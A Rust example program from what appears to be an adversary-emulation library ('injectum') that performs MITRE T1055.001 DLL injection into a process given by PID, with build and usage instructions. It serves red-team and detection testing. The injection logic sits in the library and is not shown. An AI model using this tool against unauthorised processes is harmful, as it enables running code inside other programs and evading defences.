//! Example: T1055.001 - DLL Injection
//!
//! Demonstrates a classic DLL injection by specifying a target process ID (PID)
//! and the path to a DLL file.
//!
//! ## Requirements
//! - **Operating System**: Windows
//! - **Features**: This example requires the `T1055_001` feature to be enabled.
//!
//! ## Build
//! You can build this example with the following command:
//! ```sh
//! cargo (xwin) build --package injectum --example T1055_001_DLL_Injection --features "tracing,T1055_001" --release
//! ```
//!
//! ## Usage
//! ```sh
//! ./T1055_001_DLL_Injection.exe <PID> <DLL_PATH>
//! ```

use injectum::{
    InjectorBuilder, InjectumError, Payload, PayloadMetadata, StrategyType, Target, Technique,
};
use std::io::Write;
use std::process;
use std::{env::args, path::PathBuf};

#[cfg(feature = "tracing")]
use tracing::{error, info};

#[cfg(not(feature = "tracing"))]
mod logs {
    #[macro_export]
    macro_rules! info {
        ($($arg:tt)*) => {};
    }
    #[macro_export]
    macro_rules! error {
        ($($arg:tt)*) => {};
    }
}

/// Program entry point.
fn main() {
    std::panic::set_hook(Box::new(|info| {
        eprintln!("\n[!] CRITICAL PANIC: {}", info);
    }));
    setup_logging();
    if let Err(e) = run() {
        #[cfg(feature = "tracing")]
        error!("{}", e);

        eprintln!("\n[!] Fatal Error: {}", e);
        let _ = std::io::stderr().flush();
        process::exit(1);
    }
}

/// Orchestrates the injection workflow.
fn run() -> Result<(), InjectumError> {
    // setup_logging();

    let (pid, dll_path) = parse_args()?;

    info!("------------------------------------------------");
    info!("Target Process ID : {}", pid);
    info!("Payload Path      : {:?}", dll_path);
    info!("Technique         : T1055.001 (DLLInjection)");
    info!("------------------------------------------------");

    inject_dll(pid, dll_path)?;

    info!("Injection completed successfully.");
    Ok(())
}

/// Performs the DLL injection using Injectum.
fn inject_dll(pid: u32, path: PathBuf) -> Result<(), InjectumError> {
    let payload = Payload::DllFile {
        path: Some(path),
        image: None, // Classic injection uses file-based payload
        meta: PayloadMetadata {
            description: Some("CLI Argument Payload".into()),
            safe_sample: true,
            ..Default::default()
        },
    };

    let target = Target::Pid(pid);
    let strategy = StrategyType::new(Technique::T1055_001, Some("DLLInjection"));

    InjectorBuilder::new()
        .target(target)
        .strategy(strategy)
        .payload(payload)
        .execute()
}

/// Parses CLI arguments and validates the PID and DLL path.
fn parse_args() -> Result<(u32, PathBuf), InjectumError> {
    let args: Vec<String> = args().collect();

    if args.len() < 3 {
        print_usage();
        return Err(InjectumError::Argument(
            "Missing required arguments.".into(),
        ));
    }

    let pid = args[1].parse::<u32>().map_err(|_| {
        InjectumError::Argument(format!(
            "Invalid PID '{}'. Must be a positive integer.",
            args[1]
        ))
    })?;

    let raw_path = &args[2];
    let path = PathBuf::from(raw_path);
    let absolute_path = path.canonicalize().map_err(|e| {
        InjectumError::Argument(format!(
            "DLL path invalid or inaccessible '{}': {}",
            raw_path, e
        ))
    })?;

    if !absolute_path.exists() || !absolute_path.is_file() {
        return Err(InjectumError::Argument(format!(
            "Not a valid file: {:?}",
            absolute_path
        )));
    }

    Ok((pid, absolute_path))
}

fn setup_logging() {
    #[cfg(feature = "tracing")]
    {
        // Initialize logging with a default of "info" if RUST_LOG is not set
        let filter = tracing_subscriber::EnvFilter::try_from_default_env()
            .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info"));

        let _ = tracing_subscriber::fmt().with_env_filter(filter).try_init();
    }
}

fn print_usage() {
    println!("Usage:");
    println!("  T1055_001_DLL_Injection.exe <PID> <DLL_PATH>");
}
